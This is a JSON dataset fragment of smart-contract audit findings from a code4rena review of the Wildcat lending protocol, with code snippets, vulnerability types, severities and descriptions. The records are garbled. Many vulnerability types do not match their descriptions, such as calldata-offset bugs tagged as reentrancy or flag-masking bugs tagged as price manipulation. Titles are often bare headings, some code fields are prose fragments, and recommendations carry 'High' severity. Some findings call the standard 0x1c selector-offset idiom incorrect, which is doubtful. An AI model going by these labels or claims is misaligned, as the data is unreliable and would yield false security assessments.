    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nassembly {\n  mstore(add(addAllowedSenderOnChainCalldata, 0x24), account)\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Description:",
    "description": "Within the [`_updateSphereXEngineOnRegisteredContractsInSet` function](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatArchController.sol#L116-L142), when `engineAddress` is not `address(0)`, the contract modifies the `addAllowedSenderOnChainCalldata` by storing the `account` at an offset of `0x24`. This approach assumes a specific calldata structure, which may not align with the actual function signature of `ISphereXEngine.addAllowedSenderOnChain`. Incorrectly positioning the `account` parameter can lead to malformed calldata, causing the external call to fail or behave unexpectedly. **Exact Code Snippet:** https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatArchController.sol#L135-L137 assembly { mstore(add(addAllowedSenderOnChainCalldata, 0x24), account)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.084,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "addAllowedSenderOnChain",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Impact :",
    "description": "Incorrect calldata formatting may cause the `addAllowedSenderOnChain` function to receive invalid parameters, leading to failed transactions or unintended behavior.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nassembly {\n    mstore(0x00, getCredentialSelector)\n    mstore(0x20, accountAddress)\n    // Call the provider and check if the return data is valid\n    if and(gt(returndatasize(), 0x1f), staticcall(gas(), providerAddress, 0x1c, 0x24, 0, 0x20)) {\n        credentialTimestamp := and(mload(0), 0xffffffff)\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Description:",
    "description": "The contract uses low-level assembly to construct calldata for external function calls, such as in [`_tryGetCredential`](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/FixedTermLoanHooks.sol#L507-L539) and [`_tryValidateCredential`](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/FixedTermLoanHooks.sol#L562-L622). However, it incorrectly calculates memory offsets (e.g., starting at `0x1c` instead of `0x00`), leading to improperly formatted calldata. This misalignment can cause external calls to fail or behave unexpectedly, disrupting credential validation processes. **Exact Code Snippet:** https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/FixedTermLoanHooks.sol#L517-L526 assembly { mstore(0x00, getCredentialSelector)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.319,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "abi.encodeWithSelector",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Impact",
    "description": "Incorrect calldata formatting leads to failed external calls, preventing proper credential validation and potentially blocking legitimate lender actions. **Recommendation:** Avoid using low-level assembly for calldata construction unless absolutely necessary. Utilize Solidity's high-level `abi.encodeWithSelector` and `abi.decode` functions to ensure correct and safe calldata formatting. If assembly is required for optimization, meticulously calculate memory offsets and ensure alignment with Solidity's ABI specifications. ---",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nuint32 public constant MaximumLoanTerm = 365 days;\n...\nuint32 fixedTermEndTime;\nassembly {\n    fixedTermEndTime := calldataload(hooksData.offset)\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Description:",
    "description": "The `fixedTermEndTime` is stored as a `uint32`, representing a Unix timestamp. While `uint32` can accommodate timestamps up to approximately the year 2106, it's prudent to consider future-proofing by using larger data types to avoid potential overflows or limitations as blockchain timestamps evolve. **Exact Code Snippet:** uint32 public constant MaximumLoanTerm = 365 days; ... uint32 fixedTermEndTime;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.157,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nstaticcall(gas(), _sentinel, 0x1c, 0x44, 0, 0x20)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-12] - Incorrect Calldata Construction in `_isSanctioned` Function",
    "description": "**Description:** The [`_isSanctioned` function](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L254-L273) constructs calldata for the `isSanctioned` function by setting the calldata starting at `0x1c` with a size of `0x44`. This offset is incorrect and does not align with Solidity's ABI encoding, leading to improper parameter passing. **Exact Code Snippet:** https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L265 staticcall(gas(), _sentinel, 0x1c, 0x44, 0, 0x20)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.059,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_createEscrowForUnderlyingAsset",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-14] - Lack of Sanctions Check in `_createEscrowForUnderlyingAsset` Function",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nfunction _createEscrowForUnderlyingAsset(\n  address accountAddress\n) internal returns (address escrow) {\n  // ... assembly code to create escrow without sanctions check\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Description:",
    "description": "The [`_createEscrowForUnderlyingAsset` function](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L769-L792) does not perform a sanctions check on the `accountAddress` before creating an escrow. This oversight allows sanctioned accounts to create escrows and interact with the market, potentially bypassing intended restrictions. **Exact Code Snippet:** https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L769-L792 function _createEscrowForUnderlyingAsset( address accountAddress",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.18,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_createEscrowForUnderlyingAsset",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-14] - Overwriting Memory in `_createEscrowForUnderlyingAsset` Function",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_processUnpaidWithdrawalBatch",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-15] - Missing Checks in `_processUnpaidWithdrawalBatch` Function",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.029,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nuint104 scaledAmount = state.scaleAmount(amount).toUint104();\nif (scaledAmount == 0) revert_NullBurnAmount();\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Description:",
    "description": "The [`queueWithdrawal` ](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketWithdrawals.sol#L80-L130) and [`queueFullWithdrawal` functions](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketWithdrawals.sol#L135-L148) convert user-specified amounts to `scaledAmount` without validating that the resulting scaled amounts are within acceptable ranges. This could allow users to queue withdrawals with excessively large or invalid amounts. **Exact Code Snippet:** uint104 scaledAmount = state.scaleAmount(amount).toUint104(); if (scaledAmount == 0) revert_NullBurnAmount();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.119,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "encodeHooksDeploymentConfig",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "[L-17] - Incorrect Bitmasking and Shifting in `encodeHooksDeploymentConfig` Function",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.027,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nlet originalFreeMem := mload(0x40)\n// ... perform memory operations\nmstore(0x40, originalFreeMem)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "Recommendation:",
    "description": "Preserve the original free memory pointer before modifying it and restore it after operations. For example: let originalFreeMem := mload(0x40) // ... perform memory operations mstore(0x40, originalFreeMem) Alternatively, use higher memory locations for temporary data to avoid interfering with the free memory pointer.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.107,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nlet extraCalldataBytes := sub(calldatasize(), DepositCalldataSize)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Description:",
    "description": "The hook functions calculate `extraCalldataBytes` by subtracting a `baseCalldataSize` from `calldatasize()`. However, if `calldatasize()` is less than `baseCalldataSize`, this subtraction will underflow, resulting in an incorrect `extraCalldataBytes` value. **Exact Code Snippet:** https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/HooksConfig.sol#L273 let extraCalldataBytes := sub(calldatasize(), DepositCalldataSize)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.076,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nlet shiftedData := shl(1, mload(memoryPointer))\nlet lengthByte := mul(2, length)\ntstore(transientSlot, or(shiftedData, lengthByte))\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommendation:",
    "description": "Shift the data left by 1 bit before combining it with `lengthByte` to maintain consistent encoding: let shiftedData := shl(1, mload(memoryPointer)) let lengthByte := mul(2, length) tstore(transientSlot, or(shiftedData, lengthByte)) This ensures that the data and length are correctly encoded, allowing accurate decoding in the `readToPointer` function.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.141,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_createEscrowForUnderlyingAsset",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "| **ID**  | **Vulnerability Title**                                           | **Contract Name**                  |",
    "description": "|---------|------------------------------------------------------------------|-------------------------------------| | L-01    | Misnaming Variables Leading to Conceptual Confusion              | WildcatMarket.sol                   | | L-02    | Inconsistent Usage of `baseCalldataSize` Parameter               | WildcatMarket.sol                   | | L-03    | Incorrect Bit Shifting and Storage Layout in Assembly            | WildcatMarketBase.sol               | | L-04    | Flawed Assembly Logic in `version()` Function                    | WildcatMarketBase.sol               |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "lastInterestAccruedTimestamp",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "**Description:**",
    "description": "The `WildcatMarketBase`  smart contract employs assembly code to efficiently pack multiple variables into single storage slots. However, the current implementation incorrectly handles bit shifting and storage layout within the assembly blocks. This misalignment leads to variables being stored in unintended bit positions, resulting in inaccurate data retrieval and flawed financial computations. Specifically, critical variables such as `scaleFactor` and `lastInterestAccruedTimestamp` are misaligned, which undermines the integrity of calculations related to normalization of amounts and interest accrual. ---",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.028,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "plaintext\nSlot 3 Storage Layout:\n[4:8]   | state.lastInterestAccruedTimestamp\n[8:22]  | state.scaleFactor = 1e27\n[22:24] | state.reserveRatioBips\n[24:26] | state.annualInterestBips\n[26:28] | state.protocolFeeBips\n[28:32] | state.timeDelinquent = 0\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "**Expected Behavior:**",
    "description": "Variables should be accurately shifted to align with their intended bit positions within the storage slot (`slot3`). This ensures that each variable occupies the correct segment of the storage slot, allowing for precise retrieval and reliable financial computations. **Intended Slot 3 Storage Layout:** Slot 3 Storage Layout: [4:8]   | state.lastInterestAccruedTimestamp [8:22]  | state.scaleFactor = 1e27",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.248,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n- function version() external pure returns (string memory) {\n-   assembly {\n-     mstore(0x40, 0)\n-     mstore(0x41, 0x0132)\n-     mstore(0x20, 0x20)\n-     return(0x20, 0x60)\n-   }\n- }\n+ function version() external pure returns (string memory) {\n+   assembly {\n+     // Allocate memory for the string\n+     mstore(0x40, add(mload(0x40), 0x20))\n+     // Set the length of the string (1 byte for \"2\")\n+     mstore(0x20, 1)\n+     // Store the ASCII value of \"2\" at the correct position\n+     mstore8(0x21, 0x32) // ASCII for \"2\" is 0x32\n+     // Return the memory starting at 0x20 with a length of 0x21 bytes\n+     return(0x20, 0x21)\n+   }\n+ }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "**Expected Behavior:**",
    "description": "The `version()` function should return the string `\"2\"` following 's standard string encoding. This involves setting the correct memory offsets and accurately representing the string's length and content. **Correct Implementation:** function version() external pure returns (string memory) { return \"2\"; }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.646,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "normalizedUnclaimedWithdrawals",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "High",
    "title": "**Description:**",
    "description": "The `WildcatMarketBase`  smart contract employs assembly code within the `_writeState` function to efficiently pack multiple state variables into single storage slots. However, the current implementation incorrectly handles bit shifting for these variables, leading to misaligned data within the storage slots. This misalignment results in inaccurate storage and retrieval of critical state variables such as `maxTotalSupply`, `isClosed`, `normalizedUnclaimedWithdrawals`, and `accruedProtocolFees`. Consequently, financial computations that depend on these variables may yield erroneous results, compromising the contract's financial integrity and stability.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.03,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_createEscrowForUnderlyingAsset",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-06] Incorrect Call Data Offset in `_createEscrowForUnderlyingAsset` Function of `WildcatMarketBase` Contract",
    "description": "---",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "assembly\n   mstore(0x00, 0xa1054f6b) // Function selector for createEscrow\n   mstore(0x20, borrowerAddress) // Parameter: borrower address\n   mstore(0x40, accountAddress) // Parameter: account address\n   mstore(0x60, tokenAddress) // Parameter: token address\n   ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "**Expected Behavior:**",
    "description": "The `_createEscrowForUnderlyingAsset` function should correctly prepare and execute a `staticcall` to the `sentinel` contract's `createEscrow` function. This involves: 1. **Storing the Function Selector at the Correct Memory Offset:** The function selector (`0xa1054f6b`) should be placed at the beginning of the call data (memory offset `0x00`) to ensure that the `staticcall` correctly identifies and invokes the `createEscrow` function. 2. **Executing the `staticcall` with Accurate Call Data:** The `staticcall` should include the function selector as part of the input data by starting at memory offset `0x00`, ensuring that the `sentinel` contract recognizes and executes the intended function. 3. **Handling Return Data Appropriately:** The function should verify that the `staticcall` returns the expected amount of data (`0x20` bytes) and revert if it does not, ensuring the escrow creation process relies on valid and complete responses. **Intended Function Flow:**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.262,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n  function setMaxTotalSupply(\n    uint256 _maxTotalSupply\n  ) external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n    if (state.isClosed) revert_CapacityChangeOnClosedMarket();\n\n+   if (_maxTotalSupply < state.scaledTotalSupply) revert_MaxTotalSupplyBelowCurrentSupply();\n\n    hooks.onSetMaxTotalSupply(_maxTotalSupply, state);\n    state.maxTotalSupply = _maxTotalSupply.toUint128();\n    _writeState(state);\n    emit_MaxTotalSupplyUpdated(_maxTotalSupply);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "**Code Snippet:**",
    "description": "function setMaxTotalSupply( uint256 _maxTotalSupply ) external onlyBorrower nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState(); if (state.isClosed) revert_CapacityChangeOnClosedMarket();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.523,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n   require(_maxTotalSupply >= state.scaledTotalSupply, \"Max total supply cannot be less than current total supply\");\n   ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "**Expected Behavior:**",
    "description": "The `setMaxTotalSupply` function should ensure that the new maximum total supply (`_maxTotalSupply`) is not set below the current total supply (`state.scaledTotalSupply`). This validation prevents the market from entering an invalid state where the maximum allowed supply is less than the existing supply, which could lead to overflows, underflows, or other financial inconsistencies. **Intended Function Flow:** 1. **Load Current State:** MarketState memory state = _getUpdatedState(); 2. **Check if Market is Closed:**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.121,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "encodeHooksDeploymentConfig",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-09] Misaligned Bit Shifting and Masking in `encodeHooksDeploymentConfig` Leading to Flag Overlaps",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.027,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "encodeHooksDeploymentConfig",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "**Description**",
    "description": "The `encodeHooksDeploymentConfig` function is responsible for combining optional and required flags from two `HooksConfig` instances into a single `HooksDeploymentConfig`. However, flawed bit shifting and masking operations result in overlapping flag bits, inadvertently including unintended bits (80 to 84) alongside the intended flag bits (85 to 95). This overlap compromises the integrity of the flag configuration, allowing unauthorized manipulation of flags and destabilizing the hooks mechanism.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.027,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_setCredentialAndEmitAccessGranted",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Description:",
    "description": "The `_setCredentialAndEmitAccessGranted` function sets the new credential for a lender and emits an event, but there is no validation to ensure that the newly set credential will actually expire after the specified time-to-live (TTL). This can result in credentials being set indefinitely or much longer than intended, potentially allowing users to retain access beyond the expected timeframe.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.034,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "onSetAnnualInterestAndReserveRatioBips",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Description:",
    "description": "The `onSetAnnualInterestAndReserveRatioBips` function allows the updating of two critical financial parameters\u2014`annualInterestBips` and `reserveRatioBips`\u2014for the market. However, the function does not ensure that both updates happen atomically, meaning one value may be updated while the other remains unchanged. If one of the updates fails or the transaction reverts midway, the system could be left in an inconsistent state where one parameter is updated while the other is not, leading to unintended market behavior.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.038,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": ". However, the error is not defined anywhere in the contract.\n\n2. **Missing Error Definitions:**\n\n   The contract lacks the definitions of custom errors used in the assembly code. For instance, ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Contract name : HooksFactory.sol",
    "description": "**Issue Summary:** In the provided code, there are instances where custom errors are used without proper definitions or with incorrect implementations. Specifically, the code uses hardcoded error selectors in assembly without defining the corresponding error types in . This practice can lead to confusion, misinterpretation of errors, and difficulties in debugging, ultimately affecting the reliability and maintainability of the contract. --- **Detailed Explanation:** 1. **Usage of Hardcoded Error Selectors:**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.194,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " only if the recipient is not a known lender\n       if (toStatus.isBlockedFromDeposits) revert NotApprovedLender();\n\n       // Attempt to validate the lender's access even if the market does not require\n       // a credential for transfers, as the recipient may need to be updated to reflect\n       // their new status as a known lender.\n       (bool hasValidCredential, bool wasUpdated) = _tryValidateAccessInner(toStatus, to, extraData);\n\n       // Revert if the recipient does not have a valid credential and the market requires one\n       if (market.transferRequiresAccess.and(!hasValidCredential)) {\n         revert NotApprovedLender();\n       }\n\n       _writeLenderStatus(toStatus, to, hasValidCredential, wasUpdated, true);\n     }\n   }\n   ",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Code Analysis",
